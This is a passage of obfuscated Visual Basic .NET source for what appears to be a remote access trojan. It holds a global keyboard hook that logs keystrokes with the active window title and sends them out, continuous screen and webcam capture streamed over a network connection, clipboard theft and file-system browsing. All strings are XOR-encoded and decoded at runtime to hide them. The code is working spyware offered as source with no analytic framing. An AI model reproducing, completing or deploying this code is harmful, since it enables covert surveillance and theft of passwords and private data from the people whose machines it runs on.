            q261p = Val("&H" & (Mid$(q258p, (2 * q259p) - 1, 2)))
            q262p = Asc(Mid$(q257p, ((q259p Mod Len(q257p)) + 1), 1))
            q260p += Chr(q261p Xor q262p)
        Next
        Return q260p
    End Function
    Sub q263p()
        GC.Collect(GC.MaxGeneration)
        GC.WaitForPendingFinalizers()
        q71p(System.Diagnostics.Process.GetCurrentProcess.Handle, &HFFFFFFFFUI, &HFFFFFFFFUI)
    End Sub
    Function q324p(ByVal q172p As System.Drawing.Image) As Byte()
        Dim q327p As MemoryStream = New MemoryStream
        q172p.Save(q327p, System.Drawing.Imaging.ImageFormat.Bmp)
        Return q327p.GetBuffer
    End Function
    Sub q264p()
        Try
            While q54p And q46p.Connected : Thread.Sleep(10) : q170p(q340p.q509p, q324p(q265p)) : End While
        Catch : End Try
    End Sub
    Public Function q265p() As Bitmap
        Try
            Dim q266p As Rectangle = Nothing
            Dim q267p As System.Drawing.Bitmap = Nothing
            Dim q268p As Graphics = Nothing
            q266p = Screen.PrimaryScreen.Bounds
            q267p = New Bitmap(q266p.Width, q266p.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            q268p = Graphics.FromImage(q267p)
            q268p.CopyFromScreen(q266p.X, q266p.Y, 0, 0, q266p.Size, CopyPixelOperation.SourceCopy)
            Return q267p
        Catch
            Return Nothing
        End Try
    End Function
    Sub q269p(ByVal q273p As Object)
        'q59p = New PictureBox : q59p.Size = New System.Drawing.Point(480, 360) : q59p.Location = New System.Drawing.Point(0, 0) : q59p.SizeMode = PictureBoxSizeMode.StretchImage
        q60p = New Form : q60p.Size = New System.Drawing.Point(496, 394) : q60p.Opacity = 0 : q60p.ShowIcon = False : q60p.ShowInTaskbar = False : q60p.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow : q60p.Tag = q273p
        q60p.Controls.Add(q59p) : Application.Run(q60p)
    End Sub
    Sub q270p(ByVal q320p As Object, ByVal q321p As System.EventArgs) Handles q60p.Load
        q275p(q59p, q60p.Tag.ToString)
    End Sub
    Sub q271p(ByVal q274p As Object)
        Try
            'q59p = New Windows.Forms.PictureBox With {.Size = New System.Drawing.Size(480, 360), .Location = New System.Drawing.Size(0, 0)}
            q59p = New PictureBox : q59p.Size = New System.Drawing.Point(480, 360) : q59p.Location = New System.Drawing.Point(0, 0) : q59p.SizeMode = PictureBoxSizeMode.StretchImage
            Dim q272p As New Thread(AddressOf q269p) : q272p.IsBackground = True : q272p.Start(q274p)
            While q55p And q46p.Connected
                q170p(q340p.q510p, q324p(q280p(q59p, New Rectangle(0, 0, 640, 360)))) : Thread.Sleep(100)
            End While
            q278p(q274p) : q60p.Close()
        Catch : End Try
    End Sub
    Private Sub q275p(ByVal q276p As PictureBox, ByVal q277p As String)
A:
        q58p = q74p(q277p, &H50000000, 0, 0, 0, 0, q276p.Handle.ToInt32, 0)
        If (q75p(q58p, &H40A, CInt(q277p), 0) > 0) Then
            q75p(q58p, &H435, -1, 0)
            q75p(q58p, &H434, 30, 0)
            q75p(q58p, &H432, -1, 0)
            q76p(q58p, 1, 0, 0, q276p.Width, q276p.Height, 6)
        Else
            q77p(q58p) : GoTo A
        End If
    End Sub
    Private Sub q278p(ByVal q279p As String)
        q75p(q58p, &H40A, q279p, 0) : q77p(q58p)
    End Sub
    Public Function q280p(ByVal q281p As PictureBox, ByVal q282p As RectangleF) As Bitmap
        Dim q283p As Graphics = q281p.CreateGraphics
        Dim q284p As New Bitmap(q281p.Width, q281p.Height, q283p)
        Dim q287p As Graphics = Graphics.FromImage(q284p)
        Dim q285p As IntPtr = q283p.GetHdc
        Dim q286p As IntPtr = q287p.GetHdc
        q78p(q286p, 0, 0, CInt(q282p.Width), CInt(q282p.Height), q285p, CInt(q282p.X), CInt(q282p.Y), 13369376)
        q280p = CType(q284p.Clone(), Bitmap)
        q283p.ReleaseHdc(q285p)
        q287p.ReleaseHdc(q286p)
        q283p.Dispose()
        q287p.Dispose()
    End Function
    Public Function q288p() As String
        Dim q289p As String = ""
        For Each q290p As DriveInfo In My.Computer.FileSystem.Drives
            Select Case q290p.DriveType
                Case 3
                    q289p += q340p.q511p & q290p.Name & q340p.q512p
                Case 5
                    q289p += q340p.q513p & q290p.Name & q340p.q512p
            End Select
        Next
        Return q289p
    End Function
    Public Function q291p(ByVal q292p As String) As String
        Dim q293p As New DirectoryInfo(q292p)
        Dim q294p As String = ""
        For Each q295p As DirectoryInfo In q293p.GetDirectories
            q294p += q340p.q514p & q295p.Name & q340p.q512p
        Next
        Return q294p
    End Function
    Public Function q296p(ByVal q297p As String) As String
        Dim q298p As New System.IO.DirectoryInfo(q297p)
        Dim q299p As String = ""
        For Each q300p As System.IO.FileInfo In q298p.GetFiles(q340p.q515p)
            q299p += q300p.Name & q340p.q516p & q300p.Length.ToString & q340p.q516p
        Next
        Return q299p
    End Function
    Private Sub q301p(ByVal Key As String) Handles q65p.q18p
        If q56p Then
            If q67p <> q302p() Then
                q170p(q340p.q517p & q68p & q68p & q340p.q518p & q302p() & q340p.q519p & q68p)
                q67p = q302p()
            End If
            q170p(q340p.q520p & Key.Replace(vbNewLine, q68p))
        End If
    End Sub
    Private Function q302p() As String
        Dim q303p As String
        q303p = New String(Chr(0), 100)
        q82p(q83p, q303p, 100)
        q303p = q303p.Substring(0, InStr(q303p, Chr(0)) - 1)
        Return q303p
    End Function
    Sub q304p()
        q61p = New System.Windows.Forms.Form : q61p.Text = "" : q61p.MinimizeBox = False : q61p.MaximizeBox = False : q61p.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow : q61p.ShowIcon = False : q61p.ShowInTaskbar = False : q61p.Size = New System.Drawing.Point(400, 345) : q61p.StartPosition = FormStartPosition.CenterScreen
        q62p = New Windows.Forms.TextBox : q62p.Multiline = True : q62p.Size = New System.Drawing.Point(370, 269) : q62p.BorderStyle = BorderStyle.FixedSingle : q62p.Location = New System.Drawing.Point(12, 12) : q62p.ReadOnly = True : q62p.BackColor = Color.White
        q63p = New Windows.Forms.TextBox : q63p.Size = New Size(New System.Drawing.Point(289, 20)) : q63p.BorderStyle = BorderStyle.FixedSingle : q63p.Location = New System.Drawing.Point(12, 290)
        q64p = New Windows.Forms.Button : q64p.Text = q340p.q521p : q64p.Location = New System.Drawing.Point(307, 287)
        AddHandler q61p.FormClosing, AddressOf q305p
        AddHandler q62p.TextChanged, AddressOf q306p
        AddHandler q64p.Click, AddressOf q307p
        q61p.Controls.Add(q62p)
        q61p.Controls.Add(q63p)
        q61p.Controls.Add(q64p)
        Application.Run(q61p)
    End Sub
    Sub q305p(ByVal q308p As Object, ByVal q309p As System.Windows.Forms.FormClosingEventArgs)
        q309p.Cancel = True
    End Sub
    Sub q306p(ByVal q310p As Object, ByVal q311p As System.EventArgs)
        q62p.SelectionStart = q62p.TextLength
        q62p.ScrollToCaret()
    End Sub
    Sub q307p(ByVal q312p As System.Object, ByVal q313p As System.EventArgs)
        If q63p.Text.Replace(q340p.q522p, "") = "" Then
            Exit Sub
        End If
        q170p(q340p.q523p & q63p.Text)
        q62p.Text += q340p.q524p & TimeOfDay & q340p.q525p & vbNewLine & q63p.Text & vbNewLine & vbNewLine
        q63p.Clear()
    End Sub
    Sub q314p()
        q170p(q340p.q526p & My.Computer.Clipboard.GetText.Replace(vbNewLine, q68p))
    End Sub
    Sub q315p(ByVal q316p As Object)
        My.Computer.Clipboard.SetText(q316p)
    End Sub
    Sub q317p()
        My.Computer.Clipboard.Clear()
    End Sub
End Module
Public Class q1p
    Private Declare Function q2p Lib "user32" Alias "SetWindowsHookExA" (ByVal q3p As Integer, ByVal q4p As q14p, ByVal q5p As Integer, ByVal q6p As Integer) As Integer
    Private Declare Function q7p Lib "user32" Alias "CallNextHookEx" (ByVal q8p As Integer, ByVal q9p As Integer, ByVal q10p As Integer, ByRef q11p As q24p) As Integer
    Private Declare Function q12p Lib "user32" Alias "UnhookWindowsHookEx" (ByVal q13p As Integer) As Integer
    Private Delegate Function q14p(ByVal q15p As Integer, ByVal q16p As Integer, ByRef q17p As q24p) As Integer
    Public Shared Event q18p(ByVal q19p As String)
    Public Shared Event q20p(ByVal q21p As String)
    Private Shared q22p As Integer
    Private Shared q23p As q14p
    Private Structure q24p : Public q25p As Integer : Public q26p As Integer : Public q27p As Integer : Public q28p As Integer : Public q29p As Integer : End Structure
    Public Sub q30p()
        q23p = New q14p(AddressOf q31p)
        q22p = q2p(13, q23p, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
    End Sub

    Private Function q31p(ByVal q32p As Integer, ByVal q33p As Integer, ByRef q34p As q24p) As Integer
        If (q32p = 0) Then
            Select Case q33p
                Case &H100, &H104 : RaiseEvent q18p(q36p(CType(q34p.q25p, Keys)))
                Case &H101, &H105 : RaiseEvent q20p(q36p(CType(q34p.q25p, Keys)))
            End Select
        End If
        Return q7p(q22p, q32p, q33p, q34p)
    End Function
    Public Sub q35p()
        q12p(q22p)
        MyBase.Finalize()
    End Sub
    Private Function q36p(ByVal q37p As Keys) As String
        Select Case q37p
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return q37p.ToString
                Else
                    Return q37p.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case q37p.ToString
                        Case q340p.q527p : Return q340p.q528p
                        Case q340p.q529p : Return q340p.q530p
                        Case q340p.q531p : Return q340p.q532p
                        Case q340p.q533p : Return q340p.q534p
                        Case q340p.q535p : Return q340p.q536p
                        Case q340p.q537p : Return q340p.q538p
                        Case q340p.q539p : Return q340p.q540p
                        Case q340p.q541p : Return q340p.q542p
                        Case q340p.q543p : Return q340p.q544p
                        Case q340p.q545p : Return q340p.q546p
                    End Select
                Else
                    Return q37p.ToString.Replace(q340p.q547p, Nothing)
                End If
            Case 96 To 105
                Return q37p.ToString.Replace(q340p.q548p, Nothing)
            Case 106 To 111
                Select Case q37p.ToString
                    Case q340p.q549p : Return q340p.q550p
                    Case q340p.q551p : Return q340p.q552p
                    Case q340p.q553p : Return q340p.q554p
                    Case q340p.q555p : Return q340p.q556p
                    Case q340p.q557p : Return q340p.q558p
                End Select
            Case 32
                Return q340p.q605p
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case q37p.ToString
                        Case q340p.q559p : Return q340p.q560p
                        Case q340p.q561p : Return q340p.q562p
                        Case q340p.q563p : Return q340p.q564p
                        Case q340p.q565p : Return q340p.q566p
                        Case q340p.q567p : Return q340p.q350p
                        Case q340p.q568p : Return q340p.q569p
                        Case q340p.q570p : Return q340p.q343p
                        Case q340p.q571p : Return q340p.q572p
                        Case q340p.q573p : Return q340p.q574p
                        Case q340p.q575p : Return q340p.q576p
                        Case q340p.q577p : Return q340p.q578p
                    End Select
                Else
                    Select Case q37p.ToString
                        Case q340p.q579p : Return q340p.q580p
                        Case q340p.q581p : Return q340p.q582p
                        Case q340p.q583p : Return q340p.q584p
                        Case q340p.q585p : Return q340p.q586p
                        Case q340p.q587p : Return q340p.q588p
                        Case q340p.q589p : Return q340p.q590p
                        Case q340p.q591p : Return q340p.q592p
                        Case q340p.q593p : Return q340p.q594p
                        Case q340p.q595p : Return q340p.q596p
                        Case q340p.q597p : Return q340p.q598p
                        Case q340p.q599p : Return q340p.q600p
                    End Select
                End If
            Case Keys.Return
                Return Environment.NewLine
            Case 160 To 161

            Case Else
                Return q340p.q601p + q37p.ToString + q340p.q602p
        End Select
        Return Nothing
    End Function
End Class
<Serializable()> Public Class q322p
    Implements ISerializable
    Private q323p As String
    Private q325p() As Byte
    Public Sub New(ByVal q326p As String, ByVal q328p() As Byte)
        q323p = q326p : q325p = q328p
    End Sub
    Public Sub New(ByVal q329p As SerializationInfo, ByVal q330p As StreamingContext)
        q323p = DirectCast(q329p.GetValue(q340p.q603p, GetType(String)), String)
        q325p = DirectCast(q329p.GetValue(q340p.q604p, GetType(Byte())), Byte())
    End Sub
    Public Sub q331p(ByVal q332p As SerializationInfo, ByVal q333p As StreamingContext) Implements ISerializable.GetObjectData
        q332p.AddValue(q340p.q603p, q323p) : q332p.AddValue(q340p.q604p, q325p)
    End Sub
    Public Function q334p() As String
        Return q323p
    End Function
    Public Function q336p() As Byte()
        Return q325p
    End Function
End Class
Public Class q38p
    Public q39p As Integer = 0
    Public q40p As Boolean = False
    Public q41p As Boolean = False
    Sub New(ByVal q42p As Integer)
        q39p = q42p
    End Sub
End Class
Friend NotInheritable Class q337p : Inherits SerializationBinder
    Overrides Function BindToType(ByVal q338p As String, ByVal q339p As String) As Type
        Return GetType(q322p)
    End Function
End Class
Public Class q340p
    Public Shared q341p As String = Module1.q256p("xzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcnQskyYpCybgAJgPgyekGjdmflrmsAYJCkEyI", "2620060E15263600253B0D0B032906252A3059160C10")
    Public Shared q342p As String = Module1.q256p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynX", "6A17481A23192D667A5C477D765673615F385A666A5F2E4E59657F57487A64173B34446A622220196E72")
    Public Shared q343p As String = Module1.q256p("gGxhXIIvyRLXDeEXvPQWnzcgrfBtxzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcn", "65")
    Public Shared q344p As String = Module1.q256p("QskyYpCybgAJgPgyekGjdmflrmsAYJCkEyIcVuCUlomdNielECEcSDPKNlQvLavEFEvQdUmPZzjhoEdTzAmaPJUJpFsV", "2052480F487248551471061F6955102026331C0A5F505503184B7313307A26022A7F5465180A322B055E1C1A51042B717674")
    Public Shared q345p As String = Module1.q256p("ttGxniuprKERdnJJcXJyIKwvchNGLvHhzbViIluatbVEQBdxchQoWBRXObLtJLQodkGrWJGkBFPXAviVGLcwppQcuhISQ", "43174F1A5E1B16143D7D615157387A131529350E014F1057242F7E75450E04290C21053B594C301D2B6771331B511D572607")
    Public Shared q346p As String = Module1.q256p("aZxkJdbfAUxxSTCWkAggalwHDhLcFHbtclKjGoYVfCuNIYXTfStbJfxcWgTsyZuOZdVSbQJDxakvoUusLQaNmwvh", "09100E26083D123334010F3D30")
    Public Shared q347p As String = Module1.q256p("JZFauwoxaBATHogeDJGkbRGRsszTlWvTrEsBCNDcFNgpLwlLuuhcRjjFjxcDcKOcVIWdTJnXhPZhzwjNJTYgQGSyEvtnLQcV", "392B055B12171D")
    Public Shared q348p As String = Module1.q256p("NYEUyahwovERJrctjYWYkXJTbHptfJVlPGeGmsYXVOwOBwVthTFrrRkvWHnktcTJTOFvGKLHaJtfVFdafCgg", "2A2A330D1609050A2A283B29000C07053F23051C3124300D3F0328053F241E3529113108012A3139212B3D3719")
    Public Shared q349p As String = Module1.q256p("KOJJjDKZdzRzsTIotIDIvaQBJxmEPeOZluvJzvJbKQphyBhUjSkGpjtQnYekikJUBDRYaXkYYJKLJgRQRhvlBWTnexoOos", "0C25240421282E18")
    Public Shared q350p As String = Module1.q256p("xyULbvlLsrZrnHJFsnADcnlfFEEUyKgrhVkOzzkssvUfPYYyrofcThDZWxwfpINjfAiTYULSycFgPcDbDdHZdNBAWOn", "05")
    Public Shared q351p As String = Module1.q256p("oIUSzrQrxnjBwOUEeKkNhzkzfYLgTTNCfFJcIQQiBaYPuOHJbyQTtviokNYhvntnbVgpQlWcgtIzEAvY", "35677D4A0E")
    Public Shared q352p As String = Module1.q256p("xruooJgorLSWGNWtUkhPcxsAocURHikwJCjdVavzkBTWiZeGKfVnKcdYRnOJtpurEVdlZmdStiBDFNfOUBvr", "211A091B3D061D171000031512")
    Public Shared q353p As String = Module1.q256p("ApfUzWXEVJcJTbrezvzIaboBhrFKfGANgnXCQZTvFHZoJOXDJJmHRpjnZAxBQNbJjyATSFJCrDdhrXNgElssiYTSysInhDjBc", "3922")
    Public Shared q354p As String = Module1.q256p("GFYzTOTtDtokbvSrZfrJeiPgDsdQUYuVxlrZQcCfRrFnExoHdskvHibDTJhtUQLlIpXzFpQeJDjvWwOByJrBNLLapBLZiogekZf", "013C0E1D21321B")
    Public Shared q355p As String = Module1.q256p("LDyFFsuUtUnVajYfjywVHvnnScKxxfdtGFkvNLQDloXWGUlBzjdJZuXUZJkEDoGvEtrDNwOVixQZpDOdrXQPtwVs", "09000F28151A29")
    Public Shared q356p As String = Module1.q256p("ZbphJSglASvYaVgwkYxIHKarfsBaOXggJJxoTigSPnRdwgVrSyKgXrYQAbDDtTQGvBoPLHQNSpO", "1E42467A")
    Public Shared q357p As String = Module1.q256p("hAHcyUuPjyIETDCsoKFkSJxTzWmTJkgAgppfpWBcjPdLkrVgPNxznKgAJnisfNwkKhkokmCeJtILJcJpCktjOpApbCnN", "14380718211016181624100608")
    Public Shared q358p As String = Module1.q256p("bJKspONJRxhJfLUaVFOtnuOJnwEUAkhUzEIOoLVJVojHfVVSXaCuGHCnXpQxYelHtftDsJBGmPhylfbkIvDnbU", "1F3B17113B2B0C2017050C0F2030")
    Public Shared q359p As String = Module1.q256p("PNeRrUpQbNYJhZSkAWsZmNeBShsbPhBaOrArmmuuzrBNTwUJxRpPsYSRBxUiHKAFOgnYtuVfATsAs", "0D0D331C32151826")
    Public Shared q360p As String = Module1.q256p("jrbkUzCHtlxTfCvhCLCmkGtuLdzJdlhmBODnkAYkReAbRpaYtNCZSVxDxnDFIciPiwjYlPEhsb", "3C071C1C3E3F")
    Public Shared q361p As String = Module1.q256p("bzNlzBjgdOWCnTkayFnnlrBYhnlDKZsunipQDPJrdYNJaYOCQWxmFXUBoZVxBcLTxQHPWwOZknXWnaRfWHrRbWf", "282B1F0E231813372A25350B26")
    Public Shared q362p As String = Module1.q256p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynXgGxhXIIvyRLXDeE", "190301042E183D356B270637260C276F172E1F")
    Public Shared q363p As String = Module1.q256p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynXgGxhXIIvyRLXDe", "103A010439032B2A27")
    Public Shared q364p As String = Module1.q256p("EXvPQWnzcgrfBtxzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcnQskyYpCybgAJgPgyekGjdmflrmsAYJCkE", "1B1A3F2232")
    Public Shared q365p As String = Module1.q256p("yIcVuCUlomdNielECEcSDPKNlQvLavEFEvQdUmPZzjhoEdTzAmaPJUJpFsVttGxniuprKERdnJJcXJyIKwvchNGLvHhzb", "050C311A2533")
    Public Shared q366p As String = Module1.q256p("ViIluatbVEQBdxchQoWBRXObLtJLQodkGrWJGkBFPXAviVGLcwppQcuhISQaZxkJdbfAUxxSTCWk", "1A211901051B1538657C2E44551748615F")
    Public Shared q367p As String = Module1.q256p("AggalwHDhLcFHbtclKjGoYVfCuNIYXTfStbJfxcWgTsyZuOZdVSbQJDxakvoUusLQaNmwvhJZFauwoxaBATHogeDJGkbRGRsszT", "35021218163A30")
    Public Shared q368p As String = Module1.q256p("lWvTrEsBCNDcFNgpLwlLuuhcRjjFjxcDcKOcVIWdTJnXhPZhzwjNJTYgQGSyEvtnLQcVNYEUyahwovERJrctjYWYkXJTbHpt", "241E2106211C352D6E6911666313507C47")
    Public Shared q369p As String = Module1.q256p("fJVlPGeGmsYXVOwOBwVthTFrrRkvWHnktcTJTOFvGKLHaJtfVFdafCggKOJJjDKZdzRzsTIotIDIvaQBJxmEP", "193E1924230A3003")
    Public Shared q370p As String = Module1.q256p("eOZluvJzvJbKQphyBhUjSkGpjtQnYekikJUBDRYaXkYYJKLJgRQRhvlBWTnexoOosxyULbvlLsrZrnHJFsnAD", "3C32190112250D186A4F38715D1C597258")
    Public Shared q371p As String = Module1.q256p("cnlfFEEUyKgrhVkOzzkssvUfPYYyrofcThDZWxwfpINjfAiTYULSycFgPcDbDdHZdNBAWOnoIUSzrQrxnjBwOUEeKkNhz", "3D1807343101300A20131D18")
    Public Shared q372p As String = Module1.q256p("kzfYLgTTNCfFJcIQQiBaYPuOHJbyQTtviokNYhvntnbVgpQlWcgtIzEAvYxruooJgorLSWGNWtUkhPcxsAocURHikwJCjdV", "36253525043F10213408")
    Public Shared q373p As String = Module1.q256p("avzkBTWiZeGKfVnKcdYRnOJtpurEVdlZmdStiBDFNfOUBvrApfUzWXEVJcJTbrezvzIaboBhrFKfGANg", "2439072B373C2D351229")
    Public Shared q374p As String = Module1.q256p("nXCQZTvFHZoJOXDJJmHRpjnZAxBQNbJjyATSFJCrDdhrXNgElssiYTSysInhDjBcGFYzTOTtDtokbvSrZfrJeiPg", "152C273F1919333B3F")
    Public Shared q375p As String = Module1.q256p("DsdQUYuVxlrZQcCfRrFnExoHdskvHibDTJhtUQLlIpXzFpQeJDjvWwOByJrBNLLapBLZiogekZfLDy", "3F273D3C3A1E0308")
    Public Shared q376p As String = Module1.q256p("FFsuUtUnVajYfjywVHvnnScKxxfdtGFkvNLQDloXWGUlBzjdJZuXUZJkEDoGvEtrDNwOVixQ", "1430193C173E3B26")
    Public Shared q377p As String = Module1.q256p("ZpDOdrXQPtwVsZbphJSglASvYaVgwkYxIHKarfsBaOXggJJxoTigSPnRdwgVrSyKgXrYQAbDDtTQG", "23212100393D2823")
    Public Shared q378p As String = Module1.q256p("vBoPLHQNSpOhAHcyUuPjyIETDCsoKFkSJxTzWmTJkgAgppfpWBcjPdLkrVgPNxznKgAJnisf", "311F312F2D")
    Public Shared q379p As String = Module1.q256p("NwkKhkokmCeJtILJcJpCktjOpApbCnNbJKspONJRxhJfLUaVFOtnuOJnwEUAkhUzEIOoLVJVojHfVVSXaCuGHCnXpQxYelHtft", "57")
    Public Shared q380p As String = Module1.q256p("DsJBGmPhylfbkIvDnbUPNeRrUpQbNYJhZSkAWsZmNeBShsbPhBaOrArmmuuzrBNTwUJxRpPsYS", "112B212C")
    Public Shared q381p As String = Module1.q256p("RBxUiHKAFOgnYtuVfATsAsjrbkUzCHtlxTfCvhCLCmkGtuLdzJdlhmBODnkAYkReAbRpaYtNCZSVxDxnD", "393A142A031811070C2213")
    Public Shared q382p As String = Module1.q256p("FIciPiwjYlPEhsbbzNlzBjgdOWCnTkayFnnlrBYhnlDKZsunipQDPJrdYNJaYOCQWxmFXUBoZVxBcLTxQHPWwOZknX", "3B061D251B19")
    Public Shared q383p As String = Module1.q256p("WnaRfWHrRbWfOkIDlgiFzTfcZkdyjVeCadUaIQfuPopeadmOHnkHNnaJaoUdDmuKFzpLIZFdZDiyyfdtYQjYwnyE", "15241C32121A0F")
    Public Shared q384p As String = Module1.q256p("TXmfNknCbJidGydrfcKYZGIHBgjYVVKluQyhlXSsyzJBImgfHJpLogmjZPOSklSDFSKQxIudJtxeLmKbcGJTzyRbzIYELtjP", "23")
    Public Shared q385p As String = Module1.q256p("HDItPXBIEJfUQWzljbDzyOOGbrbGRQDWAzoiKidybzISTBBRbYUdSxEwoFnGmtfegxEDtLPfnJDZnglJSpvkpOwJWSCPVagSBHt", "39")
    Public Shared q386p As String = Module1.q256p("lfeyJPXiXPJfIYtQGTZFLTtiUEdHONxwFJEghyPGtJVnGOaoFUQJnzlkJJUcyzsPcsUVmJViQfpJXubOWD", "3511163A143D1A33242516")
    Public Shared q387p As String = Module1.q256p("ZIJXUDgoJrFiulhrPCNLLxzOSBOVHhyKmspdJChdymmjwgTSuwQXJADWcFOdBlOFIfvxHANWVnJVFJmolBImy", "0E2F2C0221050C2B1F0A000618")
    Public Shared q388p As String = Module1.q256p("SrcsuYBrycPGEizcVWYFJgtvyunGTyvRUpGLIudXGmFzZVfPneVeaLLHWIkDUnHubzfgoANvJwJHtTenPLirQKAPl", "33071736382F0E")
    Public Shared q389p As String = Module1.q256p("dfZAnQUYJhkbEkQhatkSUJPAIOgmCUiArGzuHLNxRbhkHfrUpfEwJnskrttCrBwlsmOiXcpyZfEEpGNryDJ", "352E201C25023C280B0A0F")
    Public Shared q390p As String = Module1.q256p("lIpNkyXAYLBfrXSaKPUeBZdQAbNdAulbUCXZpAPyjEILhjclIOcnkJCRigAOlxlVUhKSyTCiFdNkkWKRPEJvvUA", "1A04211B2E3D233A2D2F")
    Public Shared q391p As String = Module1.q256p("ptfmaJylKozUJvxsxZvyNnHhdUBKJEIYPmtDKvzSiVGOEvvwgkJVUVuIHfTlbNBUEoxVpTzb", "3303192538101A2E1C")
    Public Shared q392p As String = Module1.q256p("YDgAyxDAaXVYuyJlQltIkwJmiSDZbWfIWTbgjRFzEbYtxpXZVPtIlCsKAxyPbEpVkVCAygQBJOxvlbOSnefxxNvDomFkt", "020E2D1C35252F003F332B09")
    Public Shared q393p As String = Module1.q256p("XhXvJbJzJefdzVIAsaKnsdZzQTccNIAfXJtaHTXelYKlkBJXJOrlVKssKDXwIfzSFJVeKrxNgkCEzyAlzslEyklJCl", "2E311A2F2F2B142B020316")
    Public Shared q394p As String = Module1.q256p("CxdhFDCctxbmspSxxssVVthwaczHzwvfBCEcgrQZNIKEvblCIJPdewDsrcTYgGmKRtzgHbDlssjA", "3E0D042309220D151F071F0F35210A1701")
    Public Shared q395p As String = Module1.q256p("eKeisTETpthVWZQRutcCfsnWhXdChmwoyCdiIuTOzpXvtjCjZKvNRKIDXlXFKZYwUNptbHTuPawJhrIn", "0C001D2024203719150410383635370707")
    Public Shared q396p As String = Module1.q256p("PISuwrOSPOsotFSuOJoipSjYieDuOWxPmHBciThdTJctAPRifpmnlZRGJUPOJiNIkCtrmKlIOTHJIZQLxocsQfukTADEt", "08230533133B32")
    Public Shared q397p As String = Module1.q256p("gsNgocaRAYKBNWzZDbQiRdEojJAUPTXozFckfgNCnFiWZeraCapQlsYSWftCCaCEDUQWpVUyZJEzdR", "372B1404170E22")
    Public Shared q398p As String = Module1.q256p("BrYmzWxORifxYERCJJrxVZFKsYEhYQAzgNdoHfYFTQCVumniRkvZvmyACBSyVNJHyTsVVLZwGQVK", "34381B1525113B371A")
    Public Shared q399p As String = Module1.q256p("dJEwmGxCRjAPCJswgSJBUkNPPXpQzPHnOnLZPLkhecicznwFsuFlwHVyRZlRnEPNwRSrhEOKmGLzcUPgcGFucxQN", "073C3302240D2E37043523")
    Public Shared q400p As String = Module1.q256p("fKjmdIatBuXJQAJwRWWFaJIoEBOTBJroczBEFQPmaiJknsyBVUWtZnfgfUgeSnNlPXgecIENkPzBkuw", "061320113A0817")
    Public Shared q401p As String = Module1.q256p("zhuRzOsVxsFEKdVHzHlrsiYavwJErdyVBdeTwIEohtRxBdGKNdHgxpCeQCvgJzPjRbcmgNBdJn", "250C02132C07230A1635")
    Public Shared q402p As String = Module1.q256p("ZLewWjwFuFFIinrHLcmScQCRgobZtUTySxaJICaomYGHJZDyYZvAGXAgIWGnlKWRnxHYLBkAZWYYkJIUaUZTcVosTmUZlCxRJR", "1C17183018162B55002F250C1D")
    Public Shared q403p As String = Module1.q256p("CLdAaPzmWxzvdwnmouHrEeuCskTOCJJSydJwRaCcDfcjvZncQOlTDcfGFXTjCJEonjFFsyIaGlwDBVfjdlJN", "1E0122043E0E")
    Public Shared q404p As String = Module1.q256p("FBwBKFZhsgyzliVOVNQHHSPxOFFrYkmIfcmzdaewWXvxwDPBEYRVZZCxgpsTZGyBClIZUsRZIxUoJTWpJRDJTIldTI", "11032339327A2516090C")
    Public Shared q405p As String = Module1.q256p("bGcStzObEbpNBjlhPWSWeIvQxrrfckcXTTcKBfpxdCoKFPbkOnTFKJgysKYAPtmUIApQlwhFLgDEIvLiRDsUowywlPQPOXYvOR", "141732060E3A12")
    Public Shared q406p As String = Module1.q256p("NzLyJzwlWYCCZlvRruFJOADSrFXsRNIRomRDxHayQygUFOhEzcgxGxLoWbVxiBIJCNmKVEgxrioZdKaLvPwlf", "290A10261F3A0D393824262810")
    Public Shared q407p As String = Module1.q256p("pNbsLjDywPtYtBydngpvZioCpiXWyUwGAKOzJWNdJGvnSTxwisjCEKGLPauVJUGdaXKhJif", "1D241A200F09181931133C063E3C161C0802")
    Public Shared q408p As String = Module1.q256p("kCeLJWFwtdpHDdngkZlaBCQylHYQfXIwpicFDafzpcizvyAXRnPrAPDlZaSCEjYPWwCOXrzSujotNjQadtpUVsiCPdOZbiE", "162B")
    Public Shared q409p As String = Module1.q256p("OpfOphgKAPUfJFeZmtlZJnUCgmnrkfWNzZmIsfVSSOVncocEsZVAnLiJHtRyusOmsQxSHyjgsFND", "4953")
    Public Shared q410p As String = Module1.q256p("DjTNJnRuEVSpGdsGpULETHYxUtbWjCczBRJGRRFPVmBOGHeaxJJLAcGdJmRoRGFuJaebNNzRTTIJp", "536C")
    Public Shared q411p As String = Module1.q256p("cLhPVrQEgUbuYGIcpZurnYWmQADlENrkBApBcLnViHeEKjTdAjzGPUQvZwWpIaePdaFobAuEJJrVygnbOKXZudVdVcUXicsYNkh", "012D")
    Public Shared q412p As String = Module1.q256p("ilKNPCbQgeGDbjHFdrTcjbHsWkGoWNXUGxxIGblbxGtsOUttKJSxrpIgAQQzSrIFyDeThtpXd", "221F")
    Public Shared q413p As String = Module1.q256p("LfonzlKhEacZZGAXCPcNXoCZwDkRTTXPBmphkfGGOHedxDeQZQJlcyNioCbeJamIVXGWgxlscOJbnbJT", "5424")
    Public Shared q414p As String = Module1.q256p("PuekguwPRmbuvLPrAHRTNnzxrioVAfpeRPPkjZrnWIDpjKQJrtNAhuXgAhKavCaJDlhJhtuxjTs", "2D35")
